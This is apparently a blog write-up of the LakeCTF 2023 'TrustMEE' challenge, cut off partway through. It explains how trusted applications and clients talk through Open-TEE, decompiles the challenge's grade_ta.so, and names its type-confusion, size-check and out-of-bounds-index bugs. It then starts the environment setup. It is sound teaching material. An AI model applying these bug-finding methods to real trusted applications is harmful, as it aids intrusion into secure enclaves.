{"pages":[{"date":"2023-12-31","image":"/post-resources/TrustMEE/i-trusted-you-meme.jpg","imageAlt":"","link":"https://chalkiadakis.me/posts/lakectf23/trust-mee/","summary":"A beginner-friendly guide to start pwning TAs from the REE.","tags":["ctf","environment setup","lakeCTF","pwn","TA","TEE"],"text":"categories: pwn\ndescription:\nthe grades are stored securely in a trusted execution environment, maybe just learning for the course would have been easier\u0026hellip;\nnc chall.polygl0ts.ch 9002\nauthors: lakectf 2023 organizers\ndockerfile, grade_ta.so, grade_ca.c, grade_ca.h, run.sh, opentee.conf, exploit_template.py\n1. introduction in this challenge, we are presented with a trusted application (ta) and our goal is to pwn it. we will write a client application (ca) that communicates with the ta through the os and tee environment. the focus of this writeup will be audience with no or little experience in tee exploitation, ta development, and environment setup. we will assume that the reader has a high level understanding of what a tee is but no knowledge of how a ta works or is implemented.\nin this challenge, the ta is running inside open-tee, which is an open-source project implementing a \u0026ldquo;virtual tee\u0026rdquo; compliant with the recent globalplatform tee specifications. the globalplatform tee specifications are nothing more than just \u0026ldquo;specifications\u0026rdquo;, i.e. they describes what apis are available and their behavior for a ta and a ca to use. the implementation of those apis is left to actual tee implementation such as open-tee, op-tee, teegris, etc and to kernel drivers.\nwith that said, one thing to clear out of the way is that open-tee and op-tee are two different things. both are tee implementations but their goal is different. open-tee is an emulation of an actual tee, with the goal of facilitating developers and researchers to write tas without any actual hardware. there is no real memory isolation mechanism in-place. the kernel and the tee run with the same privileges. on the other hand, op-tee, is a tee implementation designed as companion to a linux kernel running on arm; cortex-a cores using the trustzone technology. op-tee is designed primarily to rely on the arm trustzone technology as the underlying hardware isolation mechanism.\nalthough in this challenge the ta is not running under a real hardware-based tee, the exploitation process remains the same. if you are interested in more about open-tee, you can optionally read its paper: open-tee — an open virtual trusted execution environment [paper].\n2. reversing the ta in this challenge, we are not given the source code of the ta. instead, we are just given the grade_ta.so binary.\nfortunately, the binary is not stripped. so, let\u0026rsquo;s load it into ghidra. here are the functions defined in this ta:\nbut now what? there are a few things that we need to understand before we jump into reversing:\nthe structure of a ta the lifecycle of a ta how to communicate with a ta 3. detour! ta crash course! as an example ta implementation, we will use the digest_ta example provided by open-tee. this is a ta which you simply give a buffer as parameter and the ta calculates the hash for you. of course there is no real meaning in such a ta to exist other than demonstration purposes.\nthe source code of the ta is found in example_digest_ta.c. an example ca implementation is shown in example_sha1_ca.c which performs some sha1 hashing.\nthe open-tee implements the version 1.0.26 of the gp core api. several items were raised to gp during the implementation of open-tee which resulted in the release of version 1.1.\nthe tee internal core api is the api that is exposed to the tas and can be found in tee internal core api v1.1. the the tee client api describes and defines how a ca running in the ree should communicate with tas running in the tee and can be bound in tee client api v1.0.\n3.1 ta structure and lifecycle trusted applications are command-oriented. a ca opens a session with them and invokes commands within those sessions. tas are uniquely identifiable by a uuid. that uuid is used by cas to specify which ta they wish to communicate with. let\u0026rsquo;s examine the sha1 example:\n/* uuid must be unique */ set_ta_properties( { 0x12345678, 0x8765, 0x4321, { \u0026#39;d\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;} }, /* uuid */ 512, /* datasize */ 255, /* stacksize */ 1, /* singletoninstance */ 1, /* multisession */ 1) /* instancekeepalive */ first, some properties are defined for the ta. the uuid of this ta is { 0x12345678, 0x8765, 0x4321, { 'd', 'i', 'g', 'e', 's', 't', '0', '0'} }, which is of type tee_uuid. next, data sizes. next, it defines that this is a single instance ta. generally, tas can be either multi-instance or single-instance. multi-instance means that each session opened by a client is directed to a separate ta instance, created on demand when the session is opened and destroyed when the session closes. single-instance on the other hand means that all sessions opened by the clients are directed to a single ta instance.\nnext, the multisession is set to enabled. this means that the ta can accept multiple concurrent sessions. this property only makes sense for single-instance tas and for multi-instance tas it is ignored. if multisession is not enabled and the ta already has an active session, other cas attempting to establish a session will fail.\nfinally, instancekeepalive is set to enabled. this means that the ta instance will be preserved when there are no sessions connected to it.\nhere is also the definition of the set_ta_properties macro and the struct holding the ta properties from the source code of open-tee:\n#define property_sec_name \u0026#34;.ta_properties\u0026#34; #define set_ta_properties(...) \\ struct gpd_ta_config ta_pro __attribute__((section(property_sec_name))) = { __va_args__ }; struct gpd_ta_config { tee_uuid appid; size_t datasize; size_t stacksize; bool singletoninstance; bool multisession; bool instancekeepalive; }; as we can see, the ta properteis are stored in the .ta_properties section header. so, when we reverse our ta we should look for that section. let\u0026rsquo;s continue with analyzing the sha1 example:\n/* hash ta command ids */ #define hash_update 0x00000001 #define hash_do_final 0x00000002 #define hash_reset 0x00000003 /* hash algorithm identifier */ #define hash_md5 0x00000001 #define hash_sha1 0x00000002 tee_result ta_export ta_createentrypoint(void) { ot_log(log_err, \u0026#34;calling the create entry point\u0026#34;); return tee_success; } void ta_export ta_destroyentrypoint(void) { ot_log(log_err, \u0026#34;calling the destroy entry point\u0026#34;); } tee_result ta_export ta_opensessionentrypoint(uint32_t paramtypes, tee_param params[4], void **sessioncontext) { algorithm_identifier hash; /* ... determine which hash algorithm to use based on parameters ... */ return tee_allocateoperation((tee_operationhandle *)sessioncontext, hash, tee_mode_digest, 0); } void ta_export ta_closesessionentrypoint(void *sessioncontext) { ot_log(log_err, \u0026#34;calling the close session entry point\u0026#34;); tee_freeoperation(sessioncontext); } tee_result ta_export ta_invokecommandentrypoint(void *sessioncontext, uint32_t commandid, uint32_t paramtypes, tee_param params[4]) { tee_result tee_rv = tee_success; /* ... parse command and execute it ... */ return tee_rv; } let\u0026rsquo;s focus on the following functions:\ntee_result ta_createentrypoint(void); void ta_destroyentrypoint(void); tee_result ta_opensessionentrypoint(uint32_t paramtypes, tee_param params[4], void **sessioncontext); void ta_closesessionentrypoint(void *sessioncontext); tee_result ta_invokecommandentrypoint(void *sessioncontext, uint32_t commandid, uint32_t paramtypes, tee_param params[4]); these functions are very similar to what we saw earlier in ghidra:\nthey represent the lifecycle of a ta. when a ta instance is created, the ta_createentrypoint function is invoked — and when the instance is destroyed, ta_destroyentrypoint is invoked. both functions are called only once in the lifetime of a ta instance.\nwhen a client attempts to open a session with the ta, ta_opensessionentrypoint is invoked. the client can pass up to 4 parameters to the ta when establishing the session. when the client releases the session, ta_closesessionentrypoint is invoked. a session is used to logically connect multiple commands invoked in a ta. each session has its own state.\nta_invokecommandentrypoint is invoked when the client invokes any command on the ta. a command is issued within the context of a session and contains a command identifier, which is a 32-bit integer (uint32_t commandid), and four operation parameters, which can contain integer values or references to client-owned shared memory blocks (uint32_t paramtypes, tee_param params[4]) it is up to the ta to define the combinations of commands and their parameters that are valid to execute.\nthe above functions are called entry points. all entry point calls within a given ta instance are called in sequence, i.e. no more than one entry point is executed at any point in time. the trusted core framework implementation guarantees that a commenced entry point call is completed before any new entry point call is allowed to begin execution. it is not possible to execute multiple concurrent commands within a session. the tee guarantees that a pending command has completed before a new command is executed. since all entry points of a given ta instance are called in sequence, there is no need to use any dedicated synchronization mechanisms to maintain consistency of any ta instance memory. the sequential execution of entry points inherently guarantees this consistency.\n3.2 client (ree) to ta (tee) communication okay, now we know enough about tas. let\u0026rsquo;s see how we can write a client to communicate with tas. we will use the sha1 example again:\n#include \u0026#34;tee_client_api.h\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; static const teec_uuid uuid = { 0x12345678, 0x8765, 0x4321, { \u0026#39;d\u0026#39;, \u0026#39;i\u0026#39;, \u0026#39;g\u0026#39;, \u0026#39;e\u0026#39;, \u0026#39;s\u0026#39;, \u0026#39;t\u0026#39;, \u0026#39;0\u0026#39;, \u0026#39;0\u0026#39;} }; /* data buffer sizes */ #define data_size 256 #define sha1_size 20 /* hash ta command ids for this applet */ #define hash_update 0x00000001 #define hash_do_final 0x00000002 #define hash_reset 0x00000003 /* hash algoithm */ #define hash_md5 0x00000001 #define hash_sha1 0x00000002 int main() { teec_context context; teec_session session; teec_operation operation; teec_sharedmemory in_mem; teec_sharedmemory out_mem; teec_result tee_rv; char data[data_size]; uint8_t sha1[sha1_size]; int i; printf(\u0026#34;\\nstart: example sha1 calc app\\n\u0026#34;); /* initialize data stuctures */ memset((void *)\u0026amp;in_mem, 0, sizeof(in_mem)); memset((void *)\u0026amp;out_mem, 0, sizeof(out_mem)); memset((void *)\u0026amp;operation, 0, sizeof(operation)); memset(data, \u0026#39;y\u0026#39;, data_size); memset(sha1, 0, sha1_size); /* initialize context towards tee */ printf(\u0026#34;initializing context: \u0026#34;); tee_rv = teec_initializecontext(null, \u0026amp;context); if (tee_rv != teec_success) { printf(\u0026#34;teec_initializecontext failed: 0x%x\\n\u0026#34;, tee_rv); goto end_1; } else { printf(\u0026#34;initialized\\n\u0026#34;); } /* open session towards digest ta by specifying the correct uuid */ operation.paramtypes = teec_param_types(teec_value_input, teec_none, teec_none, teec_none); operation.params[0].value.a = hash_sha1; /* open session is expecting hash algorithm */ printf(\u0026#34;openning session: \u0026#34;); tee_rv = teec_opensession(\u0026amp;context, \u0026amp;session, \u0026amp;uuid, teec_login_public, null, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_opensession failed: 0x%x\\n\u0026#34;, tee_rv); goto end_2; } else { printf(\u0026#34;opened\\n\u0026#34;); } /* memory management and teec_invokecommand() */ /* cleanup used connection/resources */ end_4: printf(\u0026#34;releasing shared out memory..\\n\u0026#34;); teec_releasesharedmemory(\u0026amp;out_mem); end_3: printf(\u0026#34;releasing shared in memory..\\n\u0026#34;); teec_releasesharedmemory(\u0026amp;in_mem); printf(\u0026#34;closing session..\\n\u0026#34;); teec_closesession(\u0026amp;session); end_2: printf(\u0026#34;finalizing ctx..\\n\u0026#34;); teec_finalizecontext(\u0026amp;context); end_1: printf(\u0026#34;end: example sha1 calc app\\n\\n\u0026#34;); exit(tee_rv); } the entry point functions that we mentioned in the tas api are 1-to-1 mapped to functions available to clients through the client api:\nta_opensessionentrypoint \u0026lt;-\u0026gt; teec_opensession ta_closesessionentrypoint \u0026lt;-\u0026gt; teec_closesession ta_invokecommandentrypoint \u0026lt;-\u0026gt; teec_invokecommand the entry points ta_createentrypoint and ta_destroyentrypoint do not directly map to any client api. this is because when teec_opensession is invoked, a ta instance will be created if no ta instance exists.\nyou might stumble upon on some other functions, such as tee_opentasession, tee_invoketacommand, or tee_closetasession. these are apis available within the tee only. generally, the prefix tee_ is used for apis inside the tee and the prefix teec_ for apis available to clients that are running in the ree. the reason that the tee_opentasession, tee_invoketacommand, and tee_closetasession functions exist is that ta-to-ta communication is also possible and takes place entirely within the tee. however, ta-to-ta communication is not something we will deepen any further here.\n3.3 parameters and ta commands great! at this point we know:\nthe structure of a ta the lifecycle of the ta how to communicate with the ta however, there is one important thing left to cover. and that is parameters passed from the client to the ta. since our goal is to exploit a ta, our attack surface is more or less the parameters and commands that the ta expects. let\u0026rsquo;s focus on the ta_opensessionentrypoint and ta_invokecommandentrypoint implemented by the digest example ta:\ntee_result ta_export ta_opensessionentrypoint(uint32_t paramtypes, tee_param params[4], void **sessioncontext) { algorithm_identifier hash; ot_log(log_err, \u0026#34;calling the open session entry point\u0026#34;); if (tee_param_type_get(paramtypes, 0) != tee_param_type_value_input) { ot_log(log_err, \u0026#34;bad parameter at index 0: expexted value input\u0026#34;); return tee_error_bad_parameters; } switch (params[0].value.a) { case hash_md5: hash = tee_alg_md5; break; case hash_sha1: hash = tee_alg_sha1; break; default: ot_log(log_err, \u0026#34;unknow hash algorithm\u0026#34;); return tee_error_bad_parameters; } return tee_allocateoperation((tee_operationhandle *)sessioncontext, hash, tee_mode_digest, 0); } tee_result ta_export ta_invokecommandentrypoint(void *sessioncontext, uint32_t commandid, uint32_t paramtypes, tee_param params[4]) { tee_result tee_rv = tee_success; ot_log(log_err, \u0026#34;calling the invoke command entry point\u0026#34;); if (commandid == hash_reset) { tee_resetoperation(sessioncontext); } else if (commandid == hash_update) { if (tee_param_type_get(paramtypes, 0) != tee_param_type_memref_input) { ot_log(log_err, \u0026#34;bad parameter at index 0: expexted memory input\u0026#34;); return tee_error_bad_parameters; } tee_digestupdate(sessioncontext, params[0].memref.buffer, params[0].memref.size); } else if (commandid == hash_do_final) { if (tee_param_type_get(paramtypes, 0) != tee_param_type_none \u0026amp;\u0026amp; tee_param_type_get(paramtypes, 0) != tee_param_type_memref_input) { ot_log(log_err, \u0026#34;bad parameter at index 0: expexted memory input\u0026#34;); return tee_error_bad_parameters; } if (tee_param_type_get(paramtypes, 1) != tee_param_type_memref_output) { ot_log(log_err, \u0026#34;bad parameter at index 1: expexted memory output\u0026#34;); return tee_error_bad_parameters; } tee_rv = tee_digestdofinal(sessioncontext, params[0].memref.buffer, params[0].memref.size, params[1].memref.buffer, \u0026amp;params[1].memref.size); } else { ot_log(log_err, \u0026#34;unknow command id\u0026#34;); tee_rv = tee_error_bad_parameters; } return tee_rv; } when a client opens a session on a ta or invokes a command, the client can send operation parameters to the ta. the parameters encode the data associated with the operation. up to four parameters can be sent in an operation. each parameter can be individually typed by the client as a value parameter, or a memory reference parameter. each parameter is also tagged with a direction of data flow (input, output, or both input and output).\nvalue parameters carry two 32-bit integers (teec_value).\nmemory reference parameters, carry a pointer to a client-owned memory buffer (teec_registeredmemoryreference or teec_tempmemoryreference). (for output memory references, there is a built-in mechanism for the tas to report the necessary size of the buffer in case of a too-short buffer.) note that memory reference parameters typically point to memory owned by the client and shared with the ta for the duration of the operation. this is especially useful in the case of ree clients to minimize the number of memory copies and the data footprint in case a ta needs to deal with large data buffers. however, it can also have security implications as the memory is shared between the client running in the ree and the ta running in the tee!\na rogue client may well change the content of the shared memory buffer at any time, even between two consecutive memory accesses by the ta. this means that the ta needs to be carefully written to avoid any security problem if this happens and deal with toctou vulnerabilities that may arise because of this. if values in the buffer are security critical, the ta should always read data only once from a shared buffer and then validate it. it must not assume that data written to the buffer can be read unchanged later on. the data should be copied to a ta instance-owned buffer.\n// teec_operation defines the payload of either an open session or invoke command typedef struct { uint32_t started; /*!\u0026lt; must set to zero if the client may try to cancel the operation */ uint32_t paramtypes; /*!\u0026lt; encodes the type of each parameter that is being transferred */ teec_parameter params[4]; /*!\u0026lt; an array of 4 possible paramaters to share with ta */ void *imp; //implementation defined } teec_operation; typedef union { teec_tempmemoryreference tmpref; teec_registeredmemoryreference memref; teec_value value; } teec_parameter; // value parameter typedef struct { uint32_t a; uint32_t b; } teec_value; // uses a pre-registered memory or pre-allocated memory block typedef struct { teec_sharedmemory *parent; /*!\u0026lt; either a whole or partial memory reference */ size_t size; /*!\u0026lt; the size of the referenced memory region, in bytes */ size_t offset; /*!\u0026lt; the offset in bytes of the referenced memory region */ } teec_registeredmemoryreference; // a temporary memory reference typedef struct { void *buffer; /*!\u0026lt; pointer to the first byte of a buffer that needs to be referenced */ size_t size; /*!\u0026lt; size of the referenced memory region */ } teec_tempmemoryreference; memory references can be either a registered memory reference or a temporary memory reference.\na registered memory reference is a region within a block of shared memory that was created before the (open session or invoke command) operation.\na temporary memory reference directly specifies a buffer of memory owned by the ca, which is temporarily registered by the tee client api for the duration of the operation being performed.\ngenerally, a memory reference is a range of bytes which is actually shared (between the ca and ta) for a particular operation. a memory reference is described by either a teec_memoryreference or teec_tempmemoryreference structure as shown above. it can specify either:\na whole shared memory block. (teec_memoryreference) a range of bytes within a shared memory block. (teec_memoryreference) a pointer to a buffer of memory owned by the client, in which case this buffer is temporarily registered for the duration of the operation (teec_tempmemoryreference) the memory reference also specifies the direction in which data flows as it can be marked as input (client-to-ta), output (ta-to-client), or both.\na shared memory block is a region of memory allocated in the context of the client memory space that can be used to transfer data between that ca and a ta. a shared memory block can either be existing ca memory which is subsequently registered with the tee client api, or memory which is allocated on behalf of the ca using the tee client api. a shared memory block can be registered or allocated once and then used multiple times such as in multiple commands, and even in multiple sessions, provided they exist within the scope of the tee context in which the shared memory was created. overlapping shared memory registrations are allowed and a single region of client memory may be registered multiple times.\n// a shared memory block that has been registered or allocated typedef struct { void *buffer; /*!\u0026lt; pointer to a memory buffer that is shared with tee */ size_t size; /*!\u0026lt; the size of the memory buffer in bytes */ uint32_t flags; /*!\u0026lt; bit vector that can contain teec_mem_input or teec_mem_output or both */ void *imp; // implementation defined } teec_sharedmemory; with all that said, let\u0026rsquo;s see how the sha1 client now communicates with the digest ta:\nint main() { teec_context context; teec_session session; teec_operation operation; teec_sharedmemory in_mem; teec_sharedmemory out_mem; teec_result tee_rv; char data[data_size]; uint8_t sha1[sha1_size]; int i; printf(\u0026#34;\\nstart: example sha1 calc app\\n\u0026#34;); /* ... initialize data stuctures ... */ /* ... initialize context towards tee using teec_initializecontext() ... */ /* open session towards digest ta by specifying the correct uuid */ operation.paramtypes = teec_param_types(teec_value_input, teec_none, teec_none, teec_none); operation.params[0].value.a = hash_sha1; /* open session is expecting hash algorithm */ printf(\u0026#34;openning session: \u0026#34;); tee_rv = teec_opensession(\u0026amp;context, \u0026amp;session, \u0026amp;uuid, teec_login_public, null, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_opensession failed: 0x%x\\n\u0026#34;, tee_rv); goto end_2; } else { printf(\u0026#34;opened\\n\u0026#34;); } /* register shared memory for input */ in_mem.buffer = data; in_mem.size = data_size; in_mem.flags = teec_mem_input; tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;in_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to register data shared memory\\n\u0026#34;); goto end_3; } printf(\u0026#34;registered in mem..\\n\u0026#34;); /* invoke command from digest ta */ operation.paramtypes = teec_param_types(teec_memref_whole, teec_none, teec_none, teec_none); operation.params[0].memref.parent = \u0026amp;in_mem; printf(\u0026#34;invoking command: update sha1: \u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, hash_update, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); goto end_3; } else { printf(\u0026#34;done\\n\u0026#34;); } /* register shared memory for output */ out_mem.buffer = sha1; out_mem.size = sha1_size; out_mem.flags = teec_mem_output; tee_rv = teec_registersharedmemory(\u0026amp;context, \u0026amp;out_mem); if (tee_rv != tee_success) { printf(\u0026#34;failed to allocate sha1 shared memory\\n\u0026#34;); goto end_3; } printf(\u0026#34;registered out mem..\\n\u0026#34;); /* invoke second time from digest ta: * send some more data to calculate the hash over, this will be added to the original hash. * this is not strictly needed it is a test for passing 2 memref params in a single * operation */ memset(data, \u0026#39;z\u0026#39;, data_size); operation.paramtypes = teec_param_types(teec_memref_whole, teec_memref_whole, teec_none, teec_none); /* * reuse the original input shared memory, because we have just updated the contents * of the buffer */ operation.params[0].memref.parent = \u0026amp;in_mem; operation.params[1].memref.parent = \u0026amp;out_mem; printf(\u0026#34;invoking command: do final sha1: \u0026#34;); tee_rv = teec_invokecommand(\u0026amp;session, hash_do_final, \u0026amp;operation, null); if (tee_rv != teec_success) { printf(\u0026#34;teec_invokecommand failed: 0x%x\\n\u0026#34;, tee_rv); goto end_4; } else { printf(\u0026#34;done\\n\u0026#34;); } printf(\u0026#34;calculated sha1: \u0026#34;); for (i = 0; i \u0026lt; sha1_size; i++) printf(\u0026#34;%02x\u0026#34;, sha1[i]); printf(\u0026#34;\\n\u0026#34;); /* ... cleanup used connection/resources ... */ exit(tee_rv); } 3.4 security considerations so, with all that said, what can go wrong with tas?\nglobal variables. global variables have the same lifetime as the lifetime of a ta instance and can be accessed between multiple sessions and commands. this can lead to state confusion bugs. to determine whether a given buffer is a memory reference or a buffer owned by the ta itself, the function tee_checkmemoryaccessrights can be used. the uint32_t paramtypes should always be checked against what the ta expects before accessing the parameters themselves (tee_param params[4]). otherwise, vulnerabilities can occur such as type confusion leading to rce within the ta. toctou vulnerabilities can occur as memory reference parameters refer to shared memory between the client (ree) and the ta (tee). 4. reversing revisited! so, with our understanding of tas now, let\u0026rsquo;s reverse grade_ta.so. let\u0026rsquo;s first look at the properties of the ta:\nit is good to know its uuid, that it is a single instance and that it allows multiple sessions. next, we reverse engineer the entry point functions, i.e.:\nta_createentrypoint ta_destroyentrypoint ta_opensessionentrypoint ta_closesessionentrypoint ta_invokecommandentrypoint since we have the source code of open-tee, we can create a helper header for ghidra to parse and have all the data type declarations available. after some reversing, here is the final decompilation of grade_ta.so:\ntee_result ta_createentrypoint(void) { return 0; } void ta_destroyentrypoint(void) { return; } char[256] grade_key; tee_result ta_opensessionentrypoint(uint32_t paramtypes,tee_param *params,void **sessioncontext) { for(int i=0; i\u0026lt;256; i++) grade_key[i] = getrandombyte(); return tee_allocateoperation(sessioncontext,tee_alg_md5,tee_mode_digest,0); } void ta_closesessionentrypoint(void *sessioncontext) { return; } tee_result ta_invokecommandentrypoint(void *sessioncontext,uint32_t commandid,uint32_t paramtypes,tee_param *params) { tee_result tvar1; signedstudent *cursignedstudent; student *curstudent; undefined8 lineno; student *studentarray; student *student2; signedstudent *end; uint32_t idx; student *student1; size_t sz; /* assignments to `lineno` variable have been omitted */ /* sign_class */ if (commandid == sign_class) { curstudent = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; sz = params[1].memref.size; tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, curstudent,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner,cursignedstudent,sz); end = cursignedstudent + nr_students; if (tvar1 == tee_success) { while( true ) { tee_memmove(cursignedstudent,curstudent,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,curstudent-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = curstudent-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = curstudent-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); if (tvar1 != tee_success) break; cursignedstudent = cursignedstudent + 1; curstudent = curstudent + 1; if (cursignedstudent == end) { return tee_success; } } goto lab_001014fa; } } } else { if (commandid != sign_student) { if (commandid != sign_class_student) { return tee_error_bad_parameters; } /* sign_class_student */ studentarray = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; sz = params[1].memref.size; idx = params[2].value.a; tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, studentarray,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, cursignedstudent,sz); if (tvar1 == tee_success) { student1 = studentarray + (int)idx; tee_memmove(cursignedstudent,student1,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,studentarray[(int)idx].lastname,0x10); cursignedstudent-\u0026gt;grade = student1-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student1-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); if (tvar1 == tee_success) { return tee_success; } goto lab_001014fa; } } __syslog_chk(3,1,\u0026#34;%s:%s:%d bad parameters!\u0026#34;,\u0026#34;../../tas/vuln_ta/vuln_ta.c\u0026#34;, \u0026#34;ta_invokecommandentrypoint\u0026#34;,lineno); return tee_error_bad_parameters; } /* sign_student */ student2 = (student *)(params-\u0026gt;memref).buffer; cursignedstudent = (signedstudent *)params[1].memref.buffer; sz = params[1].memref.size; tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, student2,(params-\u0026gt;memref).size); if (tvar1 == tee_success) { tvar1 = tee_checkmemoryaccessrights(tee_memory_access_read | tee_memory_access_any_owner, cursignedstudent,sz); if (tvar1 == tee_success) { tee_memmove(cursignedstudent,student2,0x10); tee_memmove(cursignedstudent-\u0026gt;lastname,student2-\u0026gt;lastname,0x10); cursignedstudent-\u0026gt;grade = student2-\u0026gt;grade; cursignedstudent-\u0026gt;sciper = student2-\u0026gt;sciper; tvar1 = calculate_signature(sessioncontext,cursignedstudent); if (tvar1 == tee_success) { return tee_success; } lab_001014fa: __syslog_chk(3,1,\u0026#34;%s:%s:%d signature calculation failed!\u0026#34;,\u0026#34;../../tas/vuln_ta/vuln_ta.c\u0026#34;, \u0026#34;ta_invokecommandentrypoint\u0026#34;,lineno); return tvar1; } } } __syslog_chk(3,1,\u0026#34;%s:%s:%d bad parameters!\u0026#34;,\u0026#34;../../tas/vuln_ta/vuln_ta.c\u0026#34;, \u0026#34;ta_invokecommandentrypoint\u0026#34;,lineno); return tee_error_bad_parameters; } tee_result calculate_signature(void *sessioncontext,signedstudent *signedstudent) { tee_result tvar1; long in_fs_offset; size_t local_50; undefined hash [24]; long local_30; tvar1 = tee_error_security; local_30 = *(long *)(in_fs_offset + 0x28); if (signedstudent-\u0026gt;grade - 1u \u0026lt; 6) { tee_digestupdate(sessioncontext,signedstudent,0x10); tee_digestupdate(sessioncontext,signedstudent-\u0026gt;lastname,0x10); tee_digestupdate(sessioncontext,\u0026amp;signedstudent-\u0026gt;grade,4); tee_digestupdate(sessioncontext,grade_key,0x100); local_50 = 0x10; printf(\u0026#34;address of sig %p\\n\u0026#34;); tvar1 = tee_digestdofinal(sessioncontext,(void *)0x0,0,hash,\u0026amp;local_50); printf(\u0026#34;hash: %s\\n\u0026#34;,hash); tee_memmove(signedstudent-\u0026gt;signature,hash,(uint32_t)local_50); printf(\u0026#34;hash length: %d\\n\u0026#34;,local_50); } if (local_30 == *(long *)(in_fs_offset + 0x28)) { //stack canary check return tvar1; } __stack_chk_fail(); } the main takeaways are:\nta_opensessionentrypoint initializes some array with random data and prepares the ta for md5 hashing ta_invokecommandentrypoint accepts 3 commands: sign_class. this command signs a whole class of students, i.e. nr_students students. params[0] is a memory reference to struct student params[1] is a memory reference to struct signedstudent sign_class_student. this command signs the given student at the given index. params[0] is a memory reference to struct student params[1] is a memory reference to struct signedstudent params[2] is a value parameter and is used as an index in the params[0] buffer. sign_student. this command signs the given student using memory references. params[0] is a memory reference to struct student params[1] is a memory reference to struct signedstudent 4.1 identifying the bugs now, we have fully reversed the ta and know its functionality. next step is to spot the bugs. the first major bug is that no command checks the type of arguments and their data flow direction. this is really really really bad as type confusion is possible in all commands. the following bugs are also present:\nin sign_class, the size is not checked correctly. the line end = cursignedstudent + nr_students means that the given memory reference is always assumed to contain nr_students*sizeof(struct student) bytes. in sign_class_student, there is no bounds checking on the index. this leads to an arbitrary read. 5. detour! environment setup great! at this point we have analyzed the ta and know where the bugs are. next step is to start poking the ta by writing a client application, running it, and debugging things! in this challenge a dockerfile was provided. this dockerfile is based on the install instructions of open-tee. we augment the dockerfile a bit as shown below to facilitate easier debugging:\nfane@ctf-box:~/ctfs/lakectf23/trustmee-replay$ git diff --no-index challenge-desc/dockerfile dockerfile diff --git a/challenge-desc/dockerfile b/dockerfile index eedd449..fdeb85d 100644 --- a/challenge-desc/dockerfile +++ b/dockerfile @@ -1,7 +1,21 @@ -# docker build -t trustmee . \u0026amp;\u0026amp; docker run --rm -it ctf trustmee \u0026amp;\u0026amp; docker exec -it -u ctf [docker_id] /bin/bash +# docker build -t trustmee . +# +# docker run -v ./solution:/home/ctf/solution --cap-add=sys_ptrace --rm -it --name trustmee_1 trustmee +# * --cap-add=sys_ptrace is used so that we can run gdb inside +# * mounting a volume for easier exploit development +# to pwn the challenge: +# docker exec -it -u ctf trustmee_1 /bin/bash +# to debug the challenge +# docker exec -it -u root trustmee_1 /bin/bash from ubuntu:22.04@sha256:b492494d8e0113c4ad3fe4528a4b5ff89faa5331f7d52c5c138196f69ce176a6 +# fix locales +env lang en_us.utf8 +run apt-get update \u0026amp;\u0026amp; apt-get install -y locales +run localedef -i en_us -c -f utf-8 -a /usr/share/locale/locale.alias en_us.utf-8 + # dependencies +run apt-get install -y gdb run apt-get update \u0026amp;\u0026amp; \\ apt-get install -y wget xinetd cmake build-essential unzip git dropbear rsync openssh-client libcap2-bin python3 python3-pip \u0026amp;\u0026amp; apt-get clean @@ -9,6 +23,12 @@ run useradd -d /home/ctf/ -m -s /bin/bash ctf \u0026amp;\u0026amp; passwd -d ctf workdir /home/ctf +# setup pwndbg +run git clone https://github.com/pwndbg/pwndbg +workdir /home/ctf/pwndbg +run ./setup.sh +workdir /home/ctf/ + # clone and install opentee run apt-get install -y build-essential git pkg-config uuid-dev libelf-dev wget curl autoconf automake libtool libfuse-dev @@ -45,6 +65,9 @@ run chmod +x /opt/opentee/lib/tas/grade_ta.so copy opentee.conf /etc/ run ln -s /usr/local/lib/libmbedcrypto.so.3.1.0 /opt/opentee/lib/libmbedcrypto.so.11 +env open_tee_path /opt/opentee +env ld_library_path=\u0026#34;${ld_library_path}:$open_tee_path/lib\u0026#34; + # copy flag copy flag.txt /opt/opentee/ run chmod 000 /opt/opentee/flag.txt we first build the docker image with the command docker build -t trustmee .. then, we can run the image with the command docker run -v ./solution:/home/ctf/solution --cap-add=sys_ptrace --rm -it --name trustmee_1 trustmee. running the image should produce no output and the terminal should seem like \u0026ldquo;hanging\u0026rdquo;, since tail -f /dev/null is the last command executed by the docker\u0026rsquo;s entrypoint. attaching a volume makes ca development also easier.\nnext, in a new terminal, we can attach to the challenge using docker exec -it -u root trustmee_1 /bin/bash. here is how the environment looks like:\n5.1 creating a client application (ca) in this challenge, we are given a starting point as we are provided with a minimal client application (grade_ca.c) shown below. however, even without this starting point, we already learnt enough to be able to build it on our own 🙃\n// grade_ca.c #include \u0026#34;tee_client_api.h\u0026#34; #include \u0026#34;grade_ca.h\u0026#34; #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; static const teec_uuid uuid = { 0x11223344, 0xa710, 0x469e, { 0xac, 0xc8, 